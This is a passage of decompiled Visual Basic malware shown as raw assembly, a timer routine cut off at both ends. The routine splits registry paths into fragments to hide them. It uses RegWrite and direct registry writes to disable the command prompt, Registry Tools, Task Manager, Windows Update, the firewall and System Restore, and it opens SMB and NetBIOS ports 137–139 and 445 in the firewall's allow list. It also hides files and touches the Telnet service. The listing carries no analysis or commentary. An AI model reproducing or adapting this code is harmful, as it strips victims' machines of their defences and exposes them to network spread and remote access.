  lea eax, var_FC
  push eax
  call [00401180h]
  push eax
  call [004010DCh]
  fstp real8 ptr var_14C
  lea ecx, var_AC
  push ecx
  lea edx, var_A8
  push edx
  lea eax, var_A4
  push eax
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  lea ecx, var_FC
  push ecx
  lea edx, var_EC
  push edx
  lea eax, var_DC
  push eax
  push 00000003h
  call [00401024h]
  add esp, 00000010h
  mov var_4, 00000023h
  call [00401020h]
  mov var_10, 00000000h
  fwait
  push 0043DD71h
  jmp 0043DD22h
  lea ecx, var_C4
  push ecx
  lea edx, var_C0
  push edx
  lea eax, var_BC
  push eax
  lea ecx, var_B8
  push ecx
  lea edx, var_B4
  push edx
  lea eax, var_B0
  push eax
  lea ecx, var_AC
  push ecx
  lea edx, var_A8
  push edx
  lea eax, var_A4
  push eax
  push 00000009h
  call [00401150h]
  add esp, 00000028h
  lea ecx, var_CC
  push ecx
  lea edx, var_C8
  push edx
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  lea eax, var_10C
  push eax
  lea ecx, var_FC
  push ecx
  lea edx, var_EC
  push edx
  lea eax, var_DC
  push eax
  push 00000004h
  call [00401024h]
  add esp, 00000014h
  ret
  lea ecx, var_30
  call [00401014h]
  lea ecx, var_40
  call [00401014h]
  lea ecx, var_50
  call [00401014h]
  lea ecx, var_60
  call [00401014h]
  lea ecx, var_70
  call [00401014h]
  lea ecx, var_80
  call [00401014h]
  lea ecx, var_90
  call [00401014h]
  lea ecx, var_A0
  call [00401014h]
  ret
  mov ecx, Me
  mov edx, [ecx]
  mov eax, Me
  push eax
  call [edx+00000008h]
  mov eax, var_10
  mov ecx, var_20
  mov fs:[00000000h], ecx
  pop edi
  pop esi
  pop ebx
  mov esp, ebp
  pop ebp
  retn 0004h
End Sub

Private Sub Timer9_Timer() '459EF0
  push ebp
  mov ebp, esp
  sub esp, 00000018h
  push 00403896h ; ext_4010EC
  mov eax, fs:[00000000h]
  push eax
  mov fs:[00000000h], esp
  mov eax, 000000F0h
  call 00403890h ; ext_40109C
  push ebx
  push esi
  push edi
  mov var_18, esp
  mov var_14, 00402F00h ; "'"
  mov eax, Me
  and eax, 00000001h
  mov var_10, eax
  mov ecx, Me
  and ecx, FFFFFFFEh
  mov Me, ecx
  mov var_C, 00000000h
  mov edx, Me
  mov eax, [edx]
  mov ecx, Me
  push ecx
  call [eax+00000004h]
  mov var_4, 00000001h
  mov var_4, 00000002h
  push FFFFFFFFh
  call [00401070h]
  mov var_4, 00000003h
  push 00000000h
  push 0043946Ch ; "Ws"
  push 00439478h ; "cri"
  call [00401044h]
  mov edx, eax
  lea ecx, var_34
  call [004011ACh]
  push eax
  push 0041BFD4h ; "pt.s"
  call [00401044h]
  mov edx, eax
  lea ecx, var_38
  call [004011ACh]
  push eax
  push 0041BFE4h ; "he"
  call [00401044h]
  mov edx, eax
  lea ecx, var_3C
  call [004011ACh]
  push eax
  push 0041BFF0h ; "ll"
  call [00401044h]
  mov edx, eax
  lea ecx, var_40
  call [004011ACh]
  push eax
  lea edx, var_98
  push edx
  call [00401108h]
  lea eax, var_98
  push eax
  lea ecx, var_30
  push ecx
  call [0040116Ch]
  lea edx, var_40
  push edx
  lea eax, var_3C
  push eax
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  push 00000004h
  call [00401150h]
  add esp, 00000014h
  mov var_4, 00000004h
  push 0041AAC0h ; "HKE"
  push 0041BFFCh ; "Y_CU"
  call [00401044h]
  mov edx, eax
  lea ecx, var_34
  call [004011ACh]
  push eax
  push 0043647Ch ; "RRE"
  call [00401044h]
  mov edx, eax
  lea ecx, var_38
  call [004011ACh]
  push eax
  push 0043909Ch ; "NT_USER\Sof"
  call [00401044h]
  mov edx, eax
  lea ecx, var_3C
  call [004011ACh]
  push eax
  push 0043831Ch ; "tware\Po"
  call [00401044h]
  mov edx, eax
  lea ecx, var_40
  call [004011ACh]
  push eax
  push 00437F40h ; "licies\Mic"
  call [00401044h]
  mov edx, eax
  lea ecx, var_44
  call [004011ACh]
  push eax
  push 0041BA38h ; "ros"
  call [00401044h]
  mov edx, eax
  lea ecx, var_48
  call [004011ACh]
  push eax
  push 0043870Ch ; "oft\W"
  call [00401044h]
  mov edx, eax
  lea ecx, var_4C
  call [004011ACh]
  push eax
  push 00437D50h ; "indows\S"
  call [00401044h]
  mov edx, eax
  lea ecx, var_50
  call [004011ACh]
  push eax
  push 00437D68h ; "ys"
  call [00401044h]
  mov edx, eax
  lea ecx, var_54
  call [004011ACh]
  push eax
  push 00437B5Ch ; "tem\Di"
  call [00401044h]
  mov edx, eax
  lea ecx, var_58
  call [004011ACh]
  push eax
  push 00437B70h ; "sab"
  call [00401044h]
  mov edx, eax
  lea ecx, var_5C
  call [004011ACh]
  push eax
  push 00437B7Ch ; "le"
  call [00401044h]
  mov edx, eax
  lea ecx, var_60
  call [004011ACh]
  push eax
  push 00438334h
  call [00401044h]
  mov edx, eax
  lea ecx, var_64
  call [004011ACh]
  push eax
  push 00437978h ; "MD"
  call [00401044h]
  mov var_90, eax
  mov var_98, 00000008h
  mov var_C0, 00437984h
  mov var_C8, 00000008h
  mov var_E0, 00437398h ; "REG_DWORD"
  mov var_E8, 00000008h
  mov eax, 00000010h
  call 00403890h ; ext_40109C
  mov eax, esp
  mov ecx, var_98
  mov [eax], ecx
  mov edx, var_94
  mov [eax+00000004h], edx
  mov ecx, var_90
  mov [eax+00000008h], ecx
  mov edx, var_8C
  mov [eax+0000000Ch], edx
  mov eax, 00000010h
  call 00403890h ; ext_40109C
  mov eax, esp
  mov ecx, var_C8
  mov [eax], ecx
  mov edx, var_C4
  mov [eax+00000004h], edx
  mov ecx, var_C0
  mov [eax+00000008h], ecx
  mov edx, var_BC
  mov [eax+0000000Ch], edx
  mov eax, 00000010h
  call 00403890h ; ext_40109C
  mov eax, esp
  mov ecx, var_E8
  mov [eax], ecx
  mov edx, var_E4
  mov [eax+00000004h], edx
  mov ecx, var_E0
  mov [eax+00000008h], ecx
  mov edx, var_DC
  mov [eax+0000000Ch], edx
  push 00000003h
  push 0041C104h ; "RegWrite"
  lea eax, var_30
  push eax
  call [004010C0h]
  push eax
  call [00401184h]
  add esp, 0000003Ch
  lea ecx, var_64
  push ecx
  lea edx, var_60
  push edx
  lea eax, var_5C
  push eax
  lea ecx, var_58
  push ecx
  lea edx, var_54
  push edx
  lea eax, var_50
  push eax
  lea ecx, var_4C
  push ecx
  lea edx, var_48
  push edx
  lea eax, var_44
  push eax
  lea ecx, var_40
  push ecx
  lea edx, var_3C
  push edx
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  push 0000000Dh
  call [00401150h]
  add esp, 00000038h
  lea ecx, var_98
  call [00401014h]
  mov var_4, 00000005h
  push 004373B0h ; "HK"
  push 004373BCh ; "EY_C"
  call [00401044h]
  mov edx, eax
  lea ecx, var_34
  call [004011ACh]
  push eax
  push 0043798Ch ; "URR"
  call [00401044h]
  mov edx, eax
  lea ecx, var_38
  call [004011ACh]
  push eax
  push 004371CCh ; "ENT_U"
  call [00401044h]
  mov edx, eax
  lea ecx, var_3C
  call [004011ACh]
  push eax
  push 004371DCh ; "SE"
  call [00401044h]
  mov edx, eax
  lea ecx, var_40
  call [004011ACh]
  push eax
  push 004375B4h ; "R\S"
  call [00401044h]
  mov edx, eax
  lea ecx, var_44
  call [004011ACh]
  push eax
  push 00436FE0h ; "OFT"
  call [00401044h]
  mov edx, eax
  lea ecx, var_48
  call [004011ACh]
  push eax
  push 00436FECh ; "WARE\Mic"
  call [00401044h]
  mov edx, eax
  lea ecx, var_4C
  call [004011ACh]
  push eax
  push 00436DF4h ; "rosoft"
  call [00401044h]
  mov edx, eax
  lea ecx, var_50
  call [004011ACh]
  push eax
  push 00436E08h ; "\Win"
  call [00401044h]
  mov edx, eax
  lea ecx, var_54
  call [004011ACh]
  push eax
  push 00436C18h ; "dows\Curre"
  call [00401044h]
  mov edx, eax
  lea ecx, var_58
  call [004011ACh]
  push eax
  push 00436A24h ; "ntVers"
  call [00401044h]
  mov edx, eax
  lea ecx, var_5C
  call [004011ACh]
  push eax
  push 00436274h ; "ion\Poli"
  call [00401044h]
  mov edx, eax
  lea ecx, var_60
  call [004011ACh]
  push eax
  push 00436A38h ; "cies\Sy"
  call [00401044h]
  mov edx, eax
  lea ecx, var_64
  call [004011ACh]
  push eax
  push 004356B4h ; "stem\Dis"
  call [00401044h]
  mov edx, eax
  lea ecx, var_68
  call [004011ACh]
  push eax
  push 004356CCh ; "abl"
  call [00401044h]
  mov edx, eax
  lea ecx, var_6C
  call [004011ACh]
  push eax
  push 004356D8h ; "eRe"
  call [00401044h]
  mov edx, eax
  lea ecx, var_70
  call [004011ACh]
  push eax
  push 004356E4h ; "gis"
  call [00401044h]
  mov edx, eax
  lea ecx, var_74
  call [004011ACh]
  push eax
  push 0043628Ch ; "try"
  call [00401044h]
  mov edx, eax
  lea ecx, var_78
  call [004011ACh]
  push eax
  push 00435CBCh ; "To"
  call [00401044h]
  mov edx, eax
  lea ecx, var_7C
  call [004011ACh]
  push eax
  push 004354C4h ; "ol"
  call [00401044h]
  mov edx, eax
  lea ecx, var_80
  call [004011ACh]
  push eax
  push 004354D0h ; "s"
  call [00401044h]
  mov var_90, eax
  mov var_98, 00000008h
  mov var_C0, 00437984h
  mov var_C8, 00000008h
  push 004354D8h ; "RE"
  push 004354E4h ; "G_D"
  call [00401044h]
  mov edx, eax
  lea ecx, var_84
  call [004011ACh]
  push eax
  push 004354F0h ; "WO"
  call [00401044h]
  mov edx, eax
  lea ecx, var_88
  call [004011ACh]
  push eax
  push 004354FCh ; "RD"
  call [00401044h]
  mov var_A0, eax
  mov var_A8, 00000008h
  mov eax, 00000010h
  call 00403890h ; ext_40109C
  mov edx, esp
  mov eax, var_98
  mov [edx], eax
  mov ecx, var_94
  mov [edx+00000004h], ecx
  mov eax, var_90
  mov [edx+00000008h], eax
  mov ecx, var_8C
  mov [edx+0000000Ch], ecx
  mov eax, 00000010h
  call 00403890h ; ext_40109C
  mov edx, esp
  mov eax, var_C8
  mov [edx], eax
  mov ecx, var_C4
  mov [edx+00000004h], ecx
  mov eax, var_C0
  mov [edx+00000008h], eax
  mov ecx, var_BC
  mov [edx+0000000Ch], ecx
  mov eax, 00000010h
  call 00403890h ; ext_40109C
  mov edx, esp
  mov eax, var_A8
  mov [edx], eax
  mov ecx, var_A4
  mov [edx+00000004h], ecx
  mov eax, var_A0
  mov [edx+00000008h], eax
  mov ecx, var_9C
  mov [edx+0000000Ch], ecx
  push 00000003h
  push 0041C104h ; "RegWrite"
  lea edx, var_30
  push edx
  call [004010C0h]
  push eax
  call [00401184h]
  add esp, 0000003Ch
  lea eax, var_88
  push eax
  lea ecx, var_84
  push ecx
  lea edx, var_80
  push edx
  lea eax, var_7C
  push eax
  lea ecx, var_78
  push ecx
  lea edx, var_74
  push edx
  lea eax, var_70
  push eax
  lea ecx, var_6C
  push ecx
  lea edx, var_68
  push edx
  lea eax, var_64
  push eax
  lea ecx, var_60
  push ecx
  lea edx, var_5C
  push edx
  lea eax, var_58
  push eax
  lea ecx, var_54
  push ecx
  lea edx, var_50
  push edx
  lea eax, var_4C
  push eax
  lea ecx, var_48
  push ecx
  lea edx, var_44
  push edx
  lea eax, var_40
  push eax
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  push 00000016h
  call [00401150h]
  add esp, 0000005Ch
  lea ecx, var_A8
  push ecx
  lea edx, var_98
  push edx
  push 00000002h
  call [00401024h]
  add esp, 0000000Ch
  mov var_4, 00000006h
  mov edx, 00434D60h
  lea ecx, var_5C
  call [00401148h]
  mov edx, 00434D50h ; "Start"
  lea ecx, var_58
  call [00401148h]
  push 00435308h ; "SY"
  push 00435314h ; "STEM\Cu"
  call [00401044h]
  mov edx, eax
  lea ecx, var_34
  call [004011ACh]
  push eax
  push 0041C098h ; "rren"
  call [00401044h]
  mov edx, eax
  lea ecx, var_38
  call [004011ACh]
  push eax
  push 0043511Ch ; "tCont"
  call [00401044h]
  mov edx, eax
  lea ecx, var_3C
  call [004011ACh]
  push eax
  push 00434F14h ; "rolSet\Se"
  call [00401044h]
  mov edx, eax
  lea ecx, var_40
  call [004011ACh]
  push eax
  push 00434F2Ch ; "rvice"
  call [00401044h]
  mov edx, eax
  lea ecx, var_44
  call [004011ACh]
  push eax
  push 00434F3Ch ; "s\Sha"
  call [00401044h]
  mov edx, eax
  lea ecx, var_48
  call [004011ACh]
  push eax
  push 0043512Ch ; "redA"
  call [00401044h]
  mov edx, eax
  lea ecx, var_4C
  call [004011ACh]
  push eax
  push 00434D38h ; "cce"
  call [00401044h]
  mov edx, eax
  lea ecx, var_50
  call [004011ACh]
  push eax
  push 00434D44h ; "ss"
  call [00401044h]
  mov edx, eax
  lea ecx, var_54
  call [004011ACh]
  mov var_FC, 80000002h
  lea eax, var_5C
  push eax
  lea ecx, var_58
  push ecx
  lea edx, var_54
  push edx
  lea eax, var_FC
  push eax
  call 0045B780h
  lea ecx, var_5C
  push ecx
  lea edx, var_58
  push edx
  lea eax, var_54
  push eax
  lea ecx, var_50
  push ecx
  lea edx, var_4C
  push edx
  lea eax, var_48
  push eax
  lea ecx, var_44
  push ecx
  lea edx, var_40
  push edx
  lea eax, var_3C
  push eax
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  push 0000000Bh
  call [00401150h]
  add esp, 00000030h
  mov var_4, 00000007h
  mov edx, 00434D60h
  lea ecx, var_50
  call [00401148h]
  mov edx, 00434D50h ; "Start"
  lea ecx, var_4C
  call [00401148h]
  push 00434B4Ch ; "SYSTEM\CurrentC"
  push 00434B70h ; "ontrolS"
  call [00401044h]
  mov edx, eax
  lea ecx, var_34
  call [004011ACh]
  push eax
  push 00434984h ; "et\Ser"
  call [00401044h]
  mov edx, eax
  lea ecx, var_38
  call [004011ACh]
  push eax
  push 00434998h ; "vi"
  call [00401044h]
  mov edx, eax
  lea ecx, var_3C
  call [004011ACh]
  push eax
  push 0043477Ch ; "ces\wu"
  call [00401044h]
  mov edx, eax
  lea ecx, var_40
  call [004011ACh]
  push eax
  push 00434790h ; "aus"
  call [00401044h]
  mov edx, eax
  lea ecx, var_44
  call [004011ACh]
  push eax
  push 0043479Ch ; "erv"
  call [00401044h]
  mov edx, eax
  lea ecx, var_48
  call [004011ACh]
  mov var_FC, 80000002h
  lea eax, var_50
  push eax
  lea ecx, var_4C
  push ecx
  lea edx, var_48
  push edx
  lea eax, var_FC
  push eax
  call 0045B780h
  lea ecx, var_50
  push ecx
  lea edx, var_4C
  push edx
  lea eax, var_48
  push eax
  lea ecx, var_44
  push ecx
  lea edx, var_40
  push edx
  lea eax, var_3C
  push eax
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  push 00000008h
  call [00401150h]
  add esp, 00000024h
  mov var_4, 00000008h
  mov edx, 004394FCh ; "1a"
  lea ecx, var_3C
  call [00401148h]
  mov edx, 004394ECh ; "Epoch"
  lea ecx, var_38
  call [00401148h]
  mov edx, 00439484h ; "SYSTEM\ControlSet001\Services\SharedAccess\Epoch"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea eax, var_3C
  push eax
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  lea eax, var_FC
  push eax
  call 0045B780h
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000009h
  mov edx, 004395F8h ; "139:TCP:LocalSubNet:Enabled:@xpsp2res.dll,-22004"
  lea ecx, var_3C
  call [00401148h]
  mov edx, 004395E4h ; "139:TCP"
  lea ecx, var_38
  call [00401148h]
  mov edx, 00439508h ; "SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  lea ecx, var_FC
  push ecx
  call 0045B780h
  lea edx, var_3C
  push edx
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 0000000Ah
  mov edx, 00439660h ; "445:TCP:LocalSubNet:Enabled:@xpsp2res.dll,-22005"
  lea ecx, var_3C
  call [00401148h]
  mov edx, 004347A8h ; "445:TCP"
  lea ecx, var_38
  call [00401148h]
  mov edx, 00439508h ; "SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea edx, var_3C
  push edx
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  lea edx, var_FC
  push edx
  call 0045B780h
  lea eax, var_3C
  push eax
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 0000000Bh
  mov edx, 004396DCh ; "137:UDP:LocalSubNet:Enabled:@xpsp2res.dll,-22001"
  lea ecx, var_3C
  call [00401148h]
  mov edx, 004396C8h ; "137:UDP"
  lea ecx, var_38
  call [00401148h]
  mov edx, 00439508h ; "SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea eax, var_3C
  push eax
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  lea eax, var_FC
  push eax
  call 0045B780h
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 0000000Ch
  mov edx, 00439758h ; "138:UDP:LocalSubNet:Enabled:@xpsp2res.dll,-22002"
  lea ecx, var_3C
  call [00401148h]
  mov edx, 00439744h ; "138:UDP"
  lea ecx, var_38
  call [00401148h]
  mov edx, 00439508h ; "SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  lea ecx, var_FC
  push ecx
  call 0045B780h
  lea edx, var_3C
  push edx
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 0000000Dh
  mov edx, 004394FCh ; "1a"
  lea ecx, var_3C
  call [00401148h]
  mov edx, 004394ECh ; "Epoch"
  lea ecx, var_38
  call [00401148h]
  mov edx, 004397C0h ; "SYSTEM\CurrentControlSet\Services\SharedAccess\Epoch"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea edx, var_3C
  push edx
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  lea edx, var_FC
  push edx
  call 0045B780h
  lea eax, var_3C
  push eax
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 0000000Eh
  mov edx, 004395F8h ; "139:TCP:LocalSubNet:Enabled:@xpsp2res.dll,-22004"
  lea ecx, var_3C
  call [00401148h]
  mov edx, 004395E4h ; "139:TCP"
  lea ecx, var_38
  call [00401148h]
  mov edx, 00439844h ; "SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea eax, var_3C
  push eax
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  lea eax, var_FC
  push eax
  call 0045B780h
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 0000000Fh
  mov edx, 00439660h ; "445:TCP:LocalSubNet:Enabled:@xpsp2res.dll,-22005"
  lea ecx, var_3C
  call [00401148h]
  mov edx, 004347A8h ; "445:TCP"
  lea ecx, var_38
  call [00401148h]
  mov edx, 00439844h ; "SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  lea ecx, var_FC
  push ecx
  call 0045B780h
  lea edx, var_3C
  push edx
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000010h
  mov edx, 004396DCh ; "137:UDP:LocalSubNet:Enabled:@xpsp2res.dll,-22001"
  lea ecx, var_3C
  call [00401148h]
  mov edx, 004396C8h ; "137:UDP"
  lea ecx, var_38
  call [00401148h]
  mov edx, 00439844h ; "SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea edx, var_3C
  push edx
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  lea edx, var_FC
  push edx
  call 0045B780h
  lea eax, var_3C
  push eax
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000011h
  mov edx, 00439758h ; "138:UDP:LocalSubNet:Enabled:@xpsp2res.dll,-22002"
  lea ecx, var_3C
  call [00401148h]
  mov edx, 00439744h ; "138:UDP"
  lea ecx, var_38
  call [00401148h]
  mov edx, 00439844h ; "SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea eax, var_3C
  push eax
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  lea eax, var_FC
  push eax
  call 0045B780h
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000012h
  mov edx, 00437984h
  lea ecx, var_3C
  call [00401148h]
  mov edx, 004399A4h ; "DisableSR"
  lea ecx, var_38
  call [00401148h]
  mov edx, 00439928h ; "SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  lea ecx, var_FC
  push ecx
  call 0045B780h
  lea edx, var_3C
  push edx
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000013h
  mov edx, 00434D60h
  lea ecx, var_3C
  call [00401148h]
  mov edx, 00434D50h ; "Start"
  lea ecx, var_38
  call [00401148h]
  mov edx, 004399BCh ; "SYSTEM\ControlSet001\Services\Sr"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea edx, var_3C
  push edx
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  lea edx, var_FC
  push edx
  call 0045B780h
  lea eax, var_3C
  push eax
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000014h
  mov edx, 00430640h ; "\SystemRoot\system32\DRIVERS\sr.sys"
  lea ecx, var_3C
  call [00401148h]
  mov edx, 00439A04h ; "ImagePath"
  lea ecx, var_38
  call [00401148h]
  mov edx, 004399BCh ; "SYSTEM\ControlSet001\Services\Sr"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea eax, var_3C
  push eax
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  lea eax, var_FC
  push eax
  call 0045B780h
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000015h
  mov edx, 00437984h
  lea ecx, var_3C
  call [00401148h]
  mov edx, 00439A88h ; "FirstRun"
  lea ecx, var_38
  call [00401148h]
  mov edx, 00439A2Ch ; "SYSTEM\ControlSet001\Services\Sr\Parameters"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  lea ecx, var_FC
  push ecx
  call 0045B780h
  lea edx, var_3C
  push edx
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000016h
  mov edx, 00434D60h
  lea ecx, var_3C
  call [00401148h]
  mov edx, 00434D50h ; "Start"
  lea ecx, var_38
  call [00401148h]
  mov edx, 00439AA0h ; "SYSTEM\CurrentControlSet\Services\Sr"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea edx, var_3C
  push edx
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  lea edx, var_FC
  push edx
  call 0045B780h
  lea eax, var_3C
  push eax
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000017h
  mov edx, 00430640h ; "\SystemRoot\system32\DRIVERS\sr.sys"
  lea ecx, var_3C
  call [00401148h]
  mov edx, 00439A04h ; "ImagePath"
  lea ecx, var_38
  call [00401148h]
  mov edx, 00439AA0h ; "SYSTEM\CurrentControlSet\Services\Sr"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea eax, var_3C
  push eax
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  lea eax, var_FC
  push eax
  call 0045B780h
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000018h
  mov edx, 00437984h
  lea ecx, var_3C
  call [00401148h]
  mov edx, 00439A88h ; "FirstRun"
  lea ecx, var_38
  call [00401148h]
  mov edx, 00439AF0h ; "SYSTEM\CurrentControlSet\Services\Sr\Parameters"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  lea ecx, var_FC
  push ecx
  call 0045B780h
  lea edx, var_3C
  push edx
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000019h
  mov edx, 00437984h
  lea ecx, var_3C
  call [00401148h]
  mov edx, 00439BCCh ; "DisableTaskMgr"
  lea ecx, var_38
  call [00401148h]
  mov edx, 00439B54h ; "Software\Microsoft\Windows\CurrentVersion\Policies\System"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000001h
  lea edx, var_3C
  push edx
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  lea edx, var_FC
  push edx
  call 0045B780h
  lea eax, var_3C
  push eax
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 0000001Ah
  mov edx, 00439CF8h
  lea ecx, var_3C
  call [00401148h]
  mov edx, 00439CE4h ; "Hidden"
  lea ecx, var_38
  call [00401148h]
  mov edx, 00439C0Ch ; "S-1-5-21-1390067357-343818398-1606980848-500\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000003h
  lea eax, var_3C
  push eax
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  lea eax, var_FC
  push eax
  call 0045B780h
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 0000001Bh
  mov edx, 00439CF8h
  lea ecx, var_3C
  call [00401148h]
  mov edx, 00439CE4h ; "Hidden"
  lea ecx, var_38
  call [00401148h]
  mov edx, 00439D00h ; "Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000001h
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  lea ecx, var_FC
  push ecx
  call 0045B780h
  lea edx, var_3C
  push edx
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 0000001Ch
  mov edx, 00439CF8h
  lea ecx, var_3C
  call [00401148h]
  mov edx, 00439D7Ch ; "ShowSuperHidden"
  lea ecx, var_38
  call [00401148h]
  mov edx, 00439D00h ; "Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000001h
  lea edx, var_3C
  push edx
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  lea edx, var_FC
  push edx
  call 0045B780h
  lea eax, var_3C
  push eax
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 0000001Dh
  mov edx, 00439BF0h
  lea ecx, var_3C
  call [00401148h]
  mov edx, 00434D50h ; "Start"
  lea ecx, var_38
  call [00401148h]
  mov edx, 00439DA0h ; "SYSTEM\ControlSet001\Services\TlntSvr"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea eax, var_3C
  push eax
  lea ecx, var_38
  push ecx
  lea edx, var_34
